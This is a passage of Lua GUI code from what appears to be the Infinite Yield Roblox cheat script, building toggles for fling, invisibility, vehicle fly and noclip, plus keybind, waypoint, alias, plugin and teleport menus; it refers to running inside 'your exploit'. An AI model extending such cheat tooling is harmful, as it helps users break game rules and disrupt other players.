	Select_11.Position = UDim2.new(0, 152, 0, 0)
	Select_11.Size = UDim2.new(0, 40, 0, 20)
	Select_11.Font = Enum.Font.SourceSans
	Select_11.TextSize = 14
	Select_11.Text = "Add"
	Select_11.TextColor3 = Color3.new(0, 0, 0)
	Select_11.ZIndex = 10
	table.insert(shade3,Select_11)
	table.insert(text2,Select_11)

	Fling.Name = "Fling"
	Fling.Parent = Toggles
	Fling.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Fling.BorderSizePixel = 0
	Fling.Position = UDim2.new(0, 0, 0, 175)
	Fling.Size = UDim2.new(0, 192, 0, 20)
	Fling.Font = Enum.Font.SourceSans
	Fling.TextSize = 14
	Fling.Text = "    Toggle Fling"
	Fling.TextColor3 = Color3.new(1, 1, 1)
	Fling.TextXAlignment = Enum.TextXAlignment.Left
	Fling.ZIndex = 10
	table.insert(shade2,Fling)
	table.insert(text1,Fling)

	Select_12.Name = "Select"
	Select_12.Parent = Fling
	Select_12.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_12.BorderSizePixel = 0
	Select_12.Position = UDim2.new(0, 152, 0, 0)
	Select_12.Size = UDim2.new(0, 40, 0, 20)
	Select_12.Font = Enum.Font.SourceSans
	Select_12.TextSize = 14
	Select_12.Text = "Add"
	Select_12.TextColor3 = Color3.new(0, 0, 0)
	Select_12.ZIndex = 10
	table.insert(shade3,Select_12)
	table.insert(text2,Select_12)

	Invisible.Name = "Invisible"
	Invisible.Parent = Toggles
	Invisible.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Invisible.BorderSizePixel = 0
	Invisible.Position = UDim2.new(0, 0, 0, 200)
	Invisible.Size = UDim2.new(0, 192, 0, 20)
	Invisible.Font = Enum.Font.SourceSans
	Invisible.TextSize = 14
	Invisible.Text = "    Toggle Invisible"
	Invisible.TextColor3 = Color3.new(1, 1, 1)
	Invisible.TextXAlignment = Enum.TextXAlignment.Left
	Invisible.ZIndex = 10
	table.insert(shade2,Invisible)
	table.insert(text1,Invisible)

	Select_14.Name = "Select"
	Select_14.Parent = Invisible
	Select_14.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_14.BorderSizePixel = 0
	Select_14.Position = UDim2.new(0, 152, 0, 0)
	Select_14.Size = UDim2.new(0, 40, 0, 20)
	Select_14.Font = Enum.Font.SourceSans
	Select_14.TextSize = 14
	Select_14.Text = "Add"
	Select_14.TextColor3 = Color3.new(0, 0, 0)
	Select_14.ZIndex = 10
	table.insert(shade3,Select_14)
	table.insert(text2,Select_14)

	Vehiclefly.Name = "VehicleFly"
	Vehiclefly.Parent = Toggles
	Vehiclefly.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Vehiclefly.BorderSizePixel = 0
	Vehiclefly.Position = UDim2.new(0, 0, 0, 225)
	Vehiclefly.Size = UDim2.new(0, 192, 0, 20)
	Vehiclefly.Font = Enum.Font.SourceSans
	Vehiclefly.TextSize = 14
	Vehiclefly.Text = "    Toggle VehicleFly"
	Vehiclefly.TextColor3 = Color3.new(1, 1, 1)
	Vehiclefly.TextXAlignment = Enum.TextXAlignment.Left
	Vehiclefly.ZIndex = 10
	table.insert(shade2,Vehiclefly)
	table.insert(text1,Vehiclefly)

	Select_15.Name = "Select"
	Select_15.Parent = Vehiclefly
	Select_15.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_15.BorderSizePixel = 0
	Select_15.Position = UDim2.new(0, 152, 0, 0)
	Select_15.Size = UDim2.new(0, 40, 0, 20)
	Select_15.Font = Enum.Font.SourceSans
	Select_15.TextSize = 14
	Select_15.Text = "Add"
	Select_15.TextColor3 = Color3.new(0, 0, 0)
	Select_15.ZIndex = 10
	table.insert(shade3,Select_15)
	table.insert(text2,Select_15)

	VehicleNoclip.Name = "VehicleNoclip"
	VehicleNoclip.Parent = Toggles
	VehicleNoclip.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	VehicleNoclip.BorderSizePixel = 0
	VehicleNoclip.Position = UDim2.new(0, 0, 0, 250)
	VehicleNoclip.Size = UDim2.new(0, 192, 0, 20)
	VehicleNoclip.Font = Enum.Font.SourceSans
	VehicleNoclip.TextSize = 14
	VehicleNoclip.Text = "    Toggle VehicleNoclip"
	VehicleNoclip.TextColor3 = Color3.new(1, 1, 1)
	VehicleNoclip.TextXAlignment = Enum.TextXAlignment.Left
	VehicleNoclip.ZIndex = 10
	table.insert(shade2,VehicleNoclip)
	table.insert(text1,VehicleNoclip)

	Select_16.Name = "Select"
	Select_16.Parent = VehicleNoclip
	Select_16.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_16.BorderSizePixel = 0
	Select_16.Position = UDim2.new(0, 152, 0, 0)
	Select_16.Size = UDim2.new(0, 40, 0, 20)
	Select_16.Font = Enum.Font.SourceSans
	Select_16.TextSize = 14
	Select_16.Text = "Add"
	Select_16.TextColor3 = Color3.new(0, 0, 0)
	Select_16.ZIndex = 10
	table.insert(shade3,Select_16)
	table.insert(text2,Select_16)

	shadow_2.Name = "shadow"
	shadow_2.Parent = KeybindEditor
	shadow_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_2.BorderSizePixel = 0
	shadow_2.Size = UDim2.new(0, 360, 0, 20)
	shadow_2.ZIndex = 10
	table.insert(shade2,shadow_2)

	PopupText_2.Name = "PopupText"
	PopupText_2.Parent = shadow_2
	PopupText_2.BackgroundTransparency = 1
	PopupText_2.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_2.ZIndex = 10
	PopupText_2.Font = Enum.Font.SourceSans
	PopupText_2.TextSize = 14
	PopupText_2.Text = "Set Keybinds"
	PopupText_2.TextColor3 = Color3.new(1, 1, 1)
	PopupText_2.TextWrapped = true
	table.insert(text1,PopupText_2)

	Exit_2.Name = "Exit"
	Exit_2.Parent = shadow_2
	Exit_2.BackgroundTransparency = 1
	Exit_2.Position = UDim2.new(1, -20, 0, 0)
	Exit_2.Size = UDim2.new(0, 20, 0, 20)
	Exit_2.Text = ""
	Exit_2.ZIndex = 10

	ExitImage_2.Parent = Exit_2
	ExitImage_2.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_2.BackgroundTransparency = 1
	ExitImage_2.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_2.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_2.Image = "rbxassetid://5054663650"
	ExitImage_2.ZIndex = 10

	PositionsFrame.Name = "PositionsFrame"
	PositionsFrame.Parent = Settings
	PositionsFrame.Active = true
	PositionsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	PositionsFrame.BorderSizePixel = 0
	PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
	PositionsFrame.Position = UDim2.new(0, 0, 0, 175)
	PositionsFrame.ZIndex = 10
	table.insert(shade1,PositionsFrame)

	Close_3.Name = "Close"
	Close_3.Parent = PositionsFrame
	Close_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_3.BorderSizePixel = 0
	Close_3.Position = UDim2.new(0, 205, 0, 150)
	Close_3.Size = UDim2.new(0, 40, 0, 20)
	Close_3.Font = Enum.Font.SourceSans
	Close_3.TextSize = 14
	Close_3.Text = "Close"
	Close_3.TextColor3 = Color3.new(1, 1, 1)
	Close_3.ZIndex = 10
	table.insert(shade2,Close_3)
	table.insert(text1,Close_3)

	Delete_5.Name = "Delete"
	Delete_5.Parent = PositionsFrame
	Delete_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete_5.BorderSizePixel = 0
	Delete_5.Position = UDim2.new(0, 50, 0, 150)
	Delete_5.Size = UDim2.new(0, 40, 0, 20)
	Delete_5.Font = Enum.Font.SourceSans
	Delete_5.TextSize = 14
	Delete_5.Text = "Clear"
	Delete_5.TextColor3 = Color3.new(1, 1, 1)
	Delete_5.ZIndex = 10
	table.insert(shade2,Delete_5)
	table.insert(text1,Delete_5)

	Part.Name = "PartGoto"
	Part.Parent = PositionsFrame
	Part.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Part.BorderSizePixel = 0
	Part.Position = UDim2.new(0, 5, 0, 150)
	Part.Size = UDim2.new(0, 40, 0, 20)
	Part.Font = Enum.Font.SourceSans
	Part.TextSize = 14
	Part.Text = "Part"
	Part.TextColor3 = Color3.new(1, 1, 1)
	Part.ZIndex = 10
	table.insert(shade2,Part)
	table.insert(text1,Part)

	Holder_4.Name = "Holder"
	Holder_4.Parent = PositionsFrame
	Holder_4.BackgroundTransparency = 1
	Holder_4.BorderSizePixel = 0
	Holder_4.Position = UDim2.new(0, 0, 0, 0)
	Holder_4.Selectable = false
	Holder_4.Size = UDim2.new(0, 250, 0, 145)
	Holder_4.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_4.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_4.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.ScrollBarThickness = 0
	Holder_4.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.VerticalScrollBarInset = 'Always'
	Holder_4.ZIndex = 10

	Example_4.Name = "Example"
	Example_4.Parent = PositionsFrame
	Example_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_4.BorderSizePixel = 0
	Example_4.Size = UDim2.new(0, 10, 0, 20)
	Example_4.Visible = false
	Example_4.Position = UDim2.new(0, 0, 0, -5)
	Example_4.ZIndex = 10
	table.insert(shade2,Example_4)

	Text_5.Name = "Text"
	Text_5.Parent = Example_4
	Text_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_5.BorderSizePixel = 0
	Text_5.Position = UDim2.new(0, 10, 0, 0)
	Text_5.Size = UDim2.new(0, 240, 0, 20)
	Text_5.Font = Enum.Font.SourceSans
	Text_5.TextSize = 14
	Text_5.Text = "Position"
	Text_5.TextColor3 = Color3.new(1, 1, 1)
	Text_5.TextXAlignment = Enum.TextXAlignment.Left
	Text_5.ZIndex = 10
	table.insert(shade2,Text_5)
	table.insert(text1,Text_5)

	Delete_6.Name = "Delete"
	Delete_6.Parent = Text_5
	Delete_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_6.BorderSizePixel = 0
	Delete_6.Position = UDim2.new(0, 200, 0, 0)
	Delete_6.Size = UDim2.new(0, 40, 0, 20)
	Delete_6.Font = Enum.Font.SourceSans
	Delete_6.TextSize = 14
	Delete_6.Text = "Delete"
	Delete_6.TextColor3 = Color3.new(0, 0, 0)
	Delete_6.ZIndex = 10
	table.insert(shade3,Delete_6)
	table.insert(text2,Delete_6)

	TP.Name = "TP"
	TP.Parent = Text_5
	TP.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	TP.BorderSizePixel = 0
	TP.Position = UDim2.new(0, 155, 0, 0)
	TP.Size = UDim2.new(0, 40, 0, 20)
	TP.Font = Enum.Font.SourceSans
	TP.TextSize = 14
	TP.Text = "Goto"
	TP.TextColor3 = Color3.new(0, 0, 0)
	TP.ZIndex = 10
	table.insert(shade3,TP)
	table.insert(text2,TP)

	AliasesFrame.Name = "AliasesFrame"
	AliasesFrame.Parent = Settings
	AliasesFrame.Active = true
	AliasesFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	AliasesFrame.BorderSizePixel = 0
	AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
	AliasesFrame.Size = UDim2.new(0, 250, 0, 175)
	AliasesFrame.ZIndex = 10
	table.insert(shade1,AliasesFrame)

	Close_2.Name = "Close"
	Close_2.Parent = AliasesFrame
	Close_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_2.BorderSizePixel = 0
	Close_2.Position = UDim2.new(0, 205, 0, 150)
	Close_2.Size = UDim2.new(0, 40, 0, 20)
	Close_2.Font = Enum.Font.SourceSans
	Close_2.TextSize = 14
	Close_2.Text = "Close"
	Close_2.TextColor3 = Color3.new(1, 1, 1)
	Close_2.ZIndex = 10
	table.insert(shade2,Close_2)
	table.insert(text1,Close_2)

	Delete_3.Name = "Delete"
	Delete_3.Parent = AliasesFrame
	Delete_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete_3.BorderSizePixel = 0
	Delete_3.Position = UDim2.new(0, 5, 0, 150)
	Delete_3.Size = UDim2.new(0, 40, 0, 20)
	Delete_3.Font = Enum.Font.SourceSans
	Delete_3.TextSize = 14
	Delete_3.Text = "Clear"
	Delete_3.TextColor3 = Color3.new(1, 1, 1)
	Delete_3.ZIndex = 10
	table.insert(shade2,Delete_3)
	table.insert(text1,Delete_3)

	Holder_3.Name = "Holder"
	Holder_3.Parent = AliasesFrame
	Holder_3.BackgroundTransparency = 1
	Holder_3.BorderSizePixel = 0
	Holder_3.Position = UDim2.new(0, 0, 0, 0)
	Holder_3.Size = UDim2.new(0, 250, 0, 145)
	Holder_3.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_3.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.ScrollBarThickness = 0
	Holder_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.VerticalScrollBarInset = 'Always'
	Holder_3.ZIndex = 10

	Example_3.Name = "Example"
	Example_3.Parent = AliasesFrame
	Example_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_3.BorderSizePixel = 0
	Example_3.Size = UDim2.new(0, 10, 0, 20)
	Example_3.Visible = false
	Example_3.ZIndex = 10
	table.insert(shade2,Example_3)

	Text_4.Name = "Text"
	Text_4.Parent = Example_3
	Text_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_4.BorderSizePixel = 0
	Text_4.Position = UDim2.new(0, 10, 0, 0)
	Text_4.Size = UDim2.new(0, 240, 0, 20)
	Text_4.Font = Enum.Font.SourceSans
	Text_4.TextSize = 14
	Text_4.Text = "honk"
	Text_4.TextColor3 = Color3.new(1, 1, 1)
	Text_4.TextXAlignment = Enum.TextXAlignment.Left
	Text_4.ZIndex = 10
	table.insert(shade2,Text_4)
	table.insert(text1,Text_4)

	Delete_4.Name = "Delete"
	Delete_4.Parent = Text_4
	Delete_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_4.BorderSizePixel = 0
	Delete_4.Position = UDim2.new(0, 200, 0, 0)
	Delete_4.Size = UDim2.new(0, 40, 0, 20)
	Delete_4.Font = Enum.Font.SourceSans
	Delete_4.TextSize = 14
	Delete_4.Text = "Delete"
	Delete_4.TextColor3 = Color3.new(0, 0, 0)
	Delete_4.ZIndex = 10
	table.insert(shade3,Delete_4)
	table.insert(text2,Delete_4)

	PluginsFrame.Name = "PluginsFrame"
	PluginsFrame.Parent = Settings
	PluginsFrame.Active = true
	PluginsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	PluginsFrame.BorderSizePixel = 0
	PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
	PluginsFrame.Size = UDim2.new(0, 250, 0, 175)
	PluginsFrame.ZIndex = 10
	table.insert(shade1,PluginsFrame)

	Close_4.Name = "Close"
	Close_4.Parent = PluginsFrame
	Close_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_4.BorderSizePixel = 0
	Close_4.Position = UDim2.new(0, 205, 0, 150)
	Close_4.Size = UDim2.new(0, 40, 0, 20)
	Close_4.Font = Enum.Font.SourceSans
	Close_4.TextSize = 14
	Close_4.Text = "Close"
	Close_4.TextColor3 = Color3.new(1, 1, 1)
	Close_4.ZIndex = 10
	table.insert(shade2,Close_4)
	table.insert(text1,Close_4)

	Add_3.Name = "Add"
	Add_3.Parent = PluginsFrame
	Add_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add_3.BorderSizePixel = 0
	Add_3.Position = UDim2.new(0, 5, 0, 150)
	Add_3.Size = UDim2.new(0, 40, 0, 20)
	Add_3.Font = Enum.Font.SourceSans
	Add_3.TextSize = 14
	Add_3.Text = "Add"
	Add_3.TextColor3 = Color3.new(1, 1, 1)
	Add_3.ZIndex = 10
	table.insert(shade2,Add_3)
	table.insert(text1,Add_3)

	Holder_5.Name = "Holder"
	Holder_5.Parent = PluginsFrame
	Holder_5.BackgroundTransparency = 1
	Holder_5.BorderSizePixel = 0
	Holder_5.Position = UDim2.new(0, 0, 0, 0)
	Holder_5.Selectable = false
	Holder_5.Size = UDim2.new(0, 250, 0, 145)
	Holder_5.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_5.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_5.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.ScrollBarThickness = 0
	Holder_5.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.VerticalScrollBarInset = 'Always'
	Holder_5.ZIndex = 10

	Example_5.Name = "Example"
	Example_5.Parent = PluginsFrame
	Example_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_5.BorderSizePixel = 0
	Example_5.Size = UDim2.new(0, 10, 0, 20)
	Example_5.Visible = false
	Example_5.ZIndex = 10
	table.insert(shade2,Example_5)

	Text_6.Name = "Text"
	Text_6.Parent = Example_5
	Text_6.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_6.BorderSizePixel = 0
	Text_6.Position = UDim2.new(0, 10, 0, 0)
	Text_6.Size = UDim2.new(0, 240, 0, 20)
	Text_6.Font = Enum.Font.SourceSans
	Text_6.TextSize = 14
	Text_6.Text = "F4 > Toggle Fly"
	Text_6.TextColor3 = Color3.new(1, 1, 1)
	Text_6.TextXAlignment = Enum.TextXAlignment.Left
	Text_6.ZIndex = 10
	table.insert(shade2,Text_6)
	table.insert(text1,Text_6)

	Delete_7.Name = "Delete"
	Delete_7.Parent = Text_6
	Delete_7.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_7.BorderSizePixel = 0
	Delete_7.Position = UDim2.new(0, 200, 0, 0)
	Delete_7.Size = UDim2.new(0, 40, 0, 20)
	Delete_7.Font = Enum.Font.SourceSans
	Delete_7.TextSize = 14
	Delete_7.Text = "Delete"
	Delete_7.TextColor3 = Color3.new(0, 0, 0)
	Delete_7.ZIndex = 10
	table.insert(shade3,Delete_7)
	table.insert(text2,Delete_7)

	PluginEditor.Name = randomString()
	PluginEditor.Parent = PARENT
	PluginEditor.BorderSizePixel = 0
	PluginEditor.Active = true
	PluginEditor.BackgroundTransparency = 1
	PluginEditor.Position = UDim2.new(0.5, -180, 0, -500)
	PluginEditor.Size = UDim2.new(0, 360, 0, 20)
	PluginEditor.ZIndex = 10

	background_3.Name = "background"
	background_3.Parent = PluginEditor
	background_3.Active = true
	background_3.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_3.BorderSizePixel = 0
	background_3.Position = UDim2.new(0, 0, 0, 20)
	background_3.Size = UDim2.new(0, 360, 0, 160)
	background_3.ZIndex = 10
	table.insert(shade1,background_3)

	Dark_9.Name = "Dark"
	Dark_9.Parent = background_3
	Dark_9.Active = true
	Dark_9.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Dark_9.BorderSizePixel = 0
	Dark_9.Position = UDim2.new(0, 222, 0, 0)
	Dark_9.Size = UDim2.new(0, 2, 0, 160)
	Dark_9.ZIndex = 10
	table.insert(shade2,Dark_9)

	Img.Name = "Img"
	Img.Parent = background_3
	Img.BackgroundTransparency = 1
	Img.Position = UDim2.new(0, 242, 0, 3)
	Img.Size = UDim2.new(0, 100, 0, 95)
	Img.Image = "rbxassetid://4113050383"
	Img.ZIndex = 10

	AddPlugin.Name = "AddPlugin"
	AddPlugin.Parent = background_3
	AddPlugin.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	AddPlugin.BorderSizePixel = 0
	AddPlugin.Position = UDim2.new(0, 235, 0, 100)
	AddPlugin.Size = UDim2.new(0, 115, 0, 50)
	AddPlugin.Font = Enum.Font.SourceSans
	AddPlugin.TextSize = 14
	AddPlugin.Text = "Add Plugin"
	AddPlugin.TextColor3 = Color3.new(1, 1, 1)
	AddPlugin.ZIndex = 10
	table.insert(shade2,AddPlugin)
	table.insert(text1,AddPlugin)

	FileName.Name = "FileName"
	FileName.Parent = background_3
	FileName.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	FileName.BorderSizePixel = 0
	FileName.Position = UDim2.new(0.028, 0, 0.625, 0)
	FileName.Size = UDim2.new(0, 200, 0, 50)
	FileName.Font = Enum.Font.SourceSans
	FileName.TextSize = 14
	FileName.Text = "Plugin File Name"
	FileName.TextColor3 = Color3.new(1, 1, 1)
	FileName.ZIndex = 10
	table.insert(shade2,FileName)
	table.insert(text1,FileName)

	About.Name = "About"
	About.Parent = background_3
	About.BackgroundTransparency = 1
	About.BorderSizePixel = 0
	About.Position = UDim2.new(0, 17, 0, 10)
	About.Size = UDim2.new(0, 187, 0, 49)
	About.Font = Enum.Font.SourceSans
	About.TextSize = 14
	About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
	About.TextColor3 = Color3.fromRGB(255, 255, 255)
	About.TextWrapped = true
	About.TextYAlignment = Enum.TextYAlignment.Top
	About.ZIndex = 10
	table.insert(text1,About)

	Directions_2.Name = "Directions"
	Directions_2.Parent = background_3
	Directions_2.BackgroundTransparency = 1
	Directions_2.BorderSizePixel = 0
	Directions_2.Position = UDim2.new(0, 17, 0, 60)
	Directions_2.Size = UDim2.new(0, 187, 0, 49)
	Directions_2.Font = Enum.Font.SourceSans
	Directions_2.TextSize = 14
	Directions_2.Text = "Type the name of the plugin file you want to add below."
	Directions_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Directions_2.TextWrapped = true
	Directions_2.TextYAlignment = Enum.TextYAlignment.Top
	Directions_2.ZIndex = 10
	table.insert(text1,Directions_2)

	shadow_3.Name = "shadow"
	shadow_3.Parent = PluginEditor
	shadow_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_3.BorderSizePixel = 0
	shadow_3.Size = UDim2.new(0, 360, 0, 20)
	shadow_3.ZIndex = 10
	table.insert(shade2,shadow_3)

	PopupText_3.Name = "PopupText"
	PopupText_3.Parent = shadow_3
	PopupText_3.BackgroundTransparency = 1
	PopupText_3.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_3.ZIndex = 10
	PopupText_3.Font = Enum.Font.SourceSans
	PopupText_3.TextSize = 14
	PopupText_3.Text = "Add Plugins"
	PopupText_3.TextColor3 = Color3.new(1, 1, 1)
	PopupText_3.TextWrapped = true
	table.insert(text1,PopupText_3)

	Exit_3.Name = "Exit"
	Exit_3.Parent = shadow_3
	Exit_3.BackgroundTransparency = 1
	Exit_3.Position = UDim2.new(1, -20, 0, 0)
	Exit_3.Size = UDim2.new(0, 20, 0, 20)
	Exit_3.Text = ""
	Exit_3.ZIndex = 10

	ExitImage_3.Parent = Exit_3
	ExitImage_3.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_3.BackgroundTransparency = 1
	ExitImage_3.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_3.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_3.Image = "rbxassetid://5054663650"
	ExitImage_3.ZIndex = 10

	AliasHint.Name = "AliasHint"
	AliasHint.Parent = AliasesFrame
	AliasHint.BackgroundTransparency = 1
	AliasHint.BorderSizePixel = 0
	AliasHint.Position = UDim2.new(0, 25, 0, 40)
	AliasHint.Size = UDim2.new(0, 200, 0, 50)
	AliasHint.Font = Enum.Font.SourceSansItalic
	AliasHint.TextSize = 16
	AliasHint.Text = "Add aliases by using the 'addalias' command"
	AliasHint.TextColor3 = Color3.new(1, 1, 1)
	AliasHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	AliasHint.TextWrapped = true
	AliasHint.ZIndex = 10
	table.insert(text1,AliasHint)

	PluginsHint.Name = "PluginsHint"
	PluginsHint.Parent = PluginsFrame
	PluginsHint.BackgroundTransparency = 1
	PluginsHint.BorderSizePixel = 0
	PluginsHint.Position = UDim2.new(0, 25, 0, 40)
	PluginsHint.Size = UDim2.new(0, 200, 0, 50)
	PluginsHint.Font = Enum.Font.SourceSansItalic
	PluginsHint.TextSize = 16
	PluginsHint.Text = "Download plugins from the IY Discord (discord.io/infiniteyield)"
	PluginsHint.TextColor3 = Color3.new(1, 1, 1)
	PluginsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	PluginsHint.TextWrapped = true
	PluginsHint.ZIndex = 10
	table.insert(text1,PluginsHint)

	PositionsHint.Name = "PositionsHint"
	PositionsHint.Parent = PositionsFrame
	PositionsHint.BackgroundTransparency = 1
	PositionsHint.BorderSizePixel = 0
	PositionsHint.Position = UDim2.new(0, 25, 0, 40)
	PositionsHint.Size = UDim2.new(0, 200, 0, 70)
	PositionsHint.Font = Enum.Font.SourceSansItalic
	PositionsHint.TextSize = 16
	PositionsHint.Text = "Use the 'swp' or 'setwaypoint' command to add a position using your character (NOTE: Part teleports will not save)"
	PositionsHint.TextColor3 = Color3.new(1, 1, 1)
	PositionsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	PositionsHint.TextWrapped = true
	PositionsHint.ZIndex = 10
	table.insert(text1,PositionsHint)

	ToPartFrame.Name = randomString()
	ToPartFrame.Parent = PARENT
	ToPartFrame.Active = true
	ToPartFrame.BackgroundTransparency = 1
	ToPartFrame.Position = UDim2.new(0.5, -180, 0, -500)
	ToPartFrame.Size = UDim2.new(0, 360, 0, 20)
	ToPartFrame.ZIndex = 10

	background_5.Name = "background"
	background_5.Parent = ToPartFrame
	background_5.Active = true
	background_5.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_5.BorderSizePixel = 0
	background_5.Position = UDim2.new(0, 0, 0, 20)
	background_5.Size = UDim2.new(0, 360, 0, 117)
	background_5.ZIndex = 10
	table.insert(shade1,background_5)

	ChoosePart.Name = "ChoosePart"
	ChoosePart.Parent = background_5
	ChoosePart.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ChoosePart.BorderSizePixel = 0
	ChoosePart.Position = UDim2.new(0, 100, 0, 55)
	ChoosePart.Size = UDim2.new(0, 75, 0, 30)
	ChoosePart.Font = Enum.Font.SourceSans
	ChoosePart.TextSize = 14
	ChoosePart.Text = "Select Part"
	ChoosePart.TextColor3 = Color3.new(1, 1, 1)
	ChoosePart.ZIndex = 10
	table.insert(shade2,ChoosePart)
	table.insert(text1,ChoosePart)

	CopyPath.Name = "CopyPath"
	CopyPath.Parent = background_5
	CopyPath.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	CopyPath.BorderSizePixel = 0
	CopyPath.Position = UDim2.new(0, 185, 0, 55)
	CopyPath.Size = UDim2.new(0, 75, 0, 30)
	CopyPath.Font = Enum.Font.SourceSans
	CopyPath.TextSize = 14
	CopyPath.Text = "Copy Path"
	CopyPath.TextColor3 = Color3.new(1, 1, 1)
	CopyPath.ZIndex = 10
	table.insert(shade2,CopyPath)
	table.insert(text1,CopyPath)

	Directions_4.Name = "Directions"
	Directions_4.Parent = background_5
	Directions_4.BackgroundTransparency = 1
	Directions_4.BorderSizePixel = 0
	Directions_4.Position = UDim2.new(0, 51, 0, 17)
	Directions_4.Size = UDim2.new(0, 257, 0, 32)
	Directions_4.Font = Enum.Font.SourceSans
	Directions_4.TextSize = 14
	Directions_4.Text = 'Click on a part and then click the "Select Part" button below to set it as a teleport location'
	Directions_4.TextColor3 = Color3.new(1, 1, 1)
	Directions_4.TextWrapped = true
	Directions_4.TextYAlignment = Enum.TextYAlignment.Top
	Directions_4.ZIndex = 10
	table.insert(text1,Directions_4)

	Path.Name = "Path"
	Path.Parent = background_5
	Path.BackgroundTransparency = 1
	Path.BorderSizePixel = 0
	Path.Position = UDim2.new(0, 0, 0, 94)
	Path.Size = UDim2.new(0, 360, 0, 16)
	Path.Font = Enum.Font.SourceSansItalic
	Path.TextSize = 14
	Path.Text = ""
	Path.TextColor3 = Color3.new(1, 1, 1)
	Path.TextScaled = true
	Path.TextWrapped = true
	Path.TextYAlignment = Enum.TextYAlignment.Top
	Path.ZIndex = 10
	table.insert(text1,Path)

	shadow_4.Name = "shadow"
	shadow_4.Parent = ToPartFrame
	shadow_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_4.BorderSizePixel = 0
	shadow_4.Size = UDim2.new(0, 360, 0, 20)
	shadow_4.ZIndex = 10
	table.insert(shade2,shadow_4)

	PopupText_5.Name = "PopupText"
	PopupText_5.Parent = shadow_4
	PopupText_5.BackgroundTransparency = 1
	PopupText_5.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_5.ZIndex = 10
	PopupText_5.Font = Enum.Font.SourceSans
	PopupText_5.TextSize = 14
	PopupText_5.Text = "Teleport to Part"
	PopupText_5.TextColor3 = Color3.new(1, 1, 1)
	PopupText_5.TextWrapped = true
	table.insert(text1,PopupText_5)

	Exit_4.Name = "Exit"
	Exit_4.Parent = shadow_4
	Exit_4.BackgroundTransparency = 1
	Exit_4.Position = UDim2.new(1, -20, 0, 0)
	Exit_4.Size = UDim2.new(0, 20, 0, 20)
	Exit_4.Text = ""
	Exit_4.ZIndex = 10

	ExitImage_5.Parent = Exit_4
	ExitImage_5.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_5.BackgroundTransparency = 1
	ExitImage_5.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_5.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_5.Image = "rbxassetid://5054663650"
